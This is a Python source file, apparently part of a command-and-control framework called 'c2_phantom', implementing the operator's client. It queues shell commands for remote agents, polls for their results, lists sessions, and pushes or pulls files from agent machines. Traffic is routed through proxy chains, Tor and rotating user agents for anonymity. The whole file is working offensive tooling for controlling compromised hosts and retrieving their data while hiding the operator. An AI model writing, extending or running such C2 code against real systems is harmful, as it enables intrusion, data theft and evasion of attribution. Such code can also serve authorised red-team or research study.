"""
C2 Client for communicating with C2 server from CLI.

Allows operators to send commands and retrieve results from the running C2 server.
Supports OPSEC features including proxy chains and Tor.
"""

import asyncio
import aiohttp
from typing import Dict, Any, Optional, List
import logging
from c2_phantom.network.anonymity import AnonymousClient


logger = logging.getLogger(__name__)


class C2Client:
    """
    Client for communicating with C2 server.

    Used by CLI commands to interact with the running C2 server instance.
    """

    def __init__(
        self, server_url: str = "http://localhost:8443", proxy_config: Optional[Dict[str, Any]] = None
    ) -> None:
        """
        Initialize C2 client with optional OPSEC features.

        Args:
            server_url: C2 server URL
            proxy_config: Optional proxy configuration with keys:
                - proxies: List of proxy URLs
                - use_tor: Use Tor for anonymity
                - rotate_ua: Rotate user agents
        """
        self.server_url = server_url.rstrip("/")
        self.anonymous_client = None

        if proxy_config:
            self.anonymous_client = AnonymousClient(
                proxies=proxy_config.get("proxies", []),
                use_tor=proxy_config.get("use_tor", False),
                rotate_user_agent=proxy_config.get("rotate_user_agent", False),
            )

    async def health_check(self) -> bool:
        """
        Check if C2 server is running using anonymous client.

        Returns:
            True if server is healthy
        """
        try:
            if self.anonymous_client:
                await self.anonymous_client.get(f"{self.server_url}/health")
                return True
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        f"{self.server_url}/health", timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        return response.status == 200
        except Exception:
            return False

    async def queue_command(self, session_id: str, command: str, command_type: str = "execute") -> Dict[str, Any]:
        """
        Queue a command for an agent using anonymous client.

        Args:
            session_id: Target session ID
            command: Command to execute
            command_type: Type of command (execute, upload, download)

        Returns:
            Response with task_id
        """
        try:
            payload = {"session_id": session_id, "type": command_type, "command": command}

            if self.anonymous_client:
                return await self.anonymous_client.post(f"{self.server_url}/api/command", json=payload)
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f"{self.server_url}/api/command", json=payload, timeout=aiohttp.ClientTimeout(total=10)
                    ) as response:
                        if response.status == 200:
                            return await response.json()
                        else:
                            error_text = await response.text()
                            raise Exception(f"Server returned {response.status}: {error_text}")

        except Exception as e:
            raise Exception(f"Failed to queue command: {str(e)}")

    async def get_result(self, session_id: str, task_id: str, timeout: int = 30) -> Optional[Dict[str, Any]]:
        """
        Wait for and retrieve command result using anonymous client.

        Args:
            session_id: Session ID
            task_id: Task ID
            timeout: Timeout in seconds

        Returns:
            Command result or None
        """
        try:
            start_time = asyncio.get_event_loop().time()

            if self.anonymous_client:
                while asyncio.get_event_loop().time() - start_time < timeout:
                    try:
                        data = await self.anonymous_client.get(f"{self.server_url}/api/result/{session_id}/{task_id}")
                        if data.get("status") == "completed":
                            return data.get("result")
                        await asyncio.sleep(1)
                    except Exception:
                        await asyncio.sleep(1)
                        continue
            else:
                async with aiohttp.ClientSession() as session:
                    while asyncio.get_event_loop().time() - start_time < timeout:
                        async with session.get(
                            f"{self.server_url}/api/result/{session_id}/{task_id}",
                            timeout=aiohttp.ClientTimeout(total=5),
                        ) as response:
                            if response.status == 200:
                                data = await response.json()
                                if data.get("status") == "completed":
                                    return data.get("result")
                            elif response.status == 404:
                                # Result not ready yet
                                await asyncio.sleep(1)
                                continue
                            else:
                                break

                        await asyncio.sleep(1)

            return None

        except Exception as e:
            logger.error(f"Error getting result: {e}")
            return None

    async def list_sessions(self, status: Optional[str] = None) -> List[Dict[str, Any]]:
        """
        List sessions from server using anonymous client.

        Args:
            status: Optional status filter (active, inactive, all)

        Returns:
            List of session data
        """
        try:
            params = {}
            if status:
                params["status"] = status

            if self.anonymous_client:
                # Note: AnonymousClient doesn't support params in get() yet, so we append to URL
                url = f"{self.server_url}/api/sessions"
                if params:
                    url += "?" + "&".join(f"{k}={v}" for k, v in params.items())
                data = await self.anonymous_client.get(url)
                return data.get("sessions", [])
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        f"{self.server_url}/api/sessions", params=params, timeout=aiohttp.ClientTimeout(total=10)
                    ) as response:
                        if response.status == 200:
                            data = await response.json()
                            return data.get("sessions", [])
                        else:
                            return []

        except Exception as e:
            logger.error(f"Error listing sessions: {e}")
            return []

    async def upload_file(self, session_id: str, local_path: str, remote_path: str) -> Dict[str, Any]:
        """
        Upload file to agent using anonymous client.

        Args:
            session_id: Target session ID
            local_path: Local file path
            remote_path: Remote destination path

        Returns:
            Upload result
        """
        try:
            import base64
            from pathlib import Path

            # Read file and encode
            file_data = Path(local_path).read_bytes()
            encoded_data = base64.b64encode(file_data).decode()

            payload = {
                "session_id": session_id,
                "type": "upload",
                "remote_path": remote_path,
                "data": encoded_data,
                "filename": Path(local_path).name,
            }

            if self.anonymous_client:
                return await self.anonymous_client.post(f"{self.server_url}/api/command", json=payload)
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f"{self.server_url}/api/command", json=payload, timeout=aiohttp.ClientTimeout(total=60)
                    ) as response:
                        if response.status == 200:
                            return await response.json()
                        else:
                            raise Exception(f"Upload failed: {response.status}")

        except Exception as e:
            raise Exception(f"Failed to upload file: {str(e)}")

    async def download_file(self, session_id: str, remote_path: str) -> Dict[str, Any]:
        """
        Download file from agent using anonymous client.

        Args:
            session_id: Target session ID
            remote_path: Remote file path to download

        Returns:
            Download result with task_id
        """
        try:
            payload = {"session_id": session_id, "type": "download", "path": remote_path}

            if self.anonymous_client:
                return await self.anonymous_client.post(f"{self.server_url}/api/command", json=payload)
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f"{self.server_url}/api/command", json=payload, timeout=aiohttp.ClientTimeout(total=60)
                    ) as response:
                        if response.status == 200:
                            return await response.json()
                        else:
                            raise Exception(f"Download failed: {response.status}")

        except Exception as e:
            raise Exception(f"Failed to download file: {str(e)}")
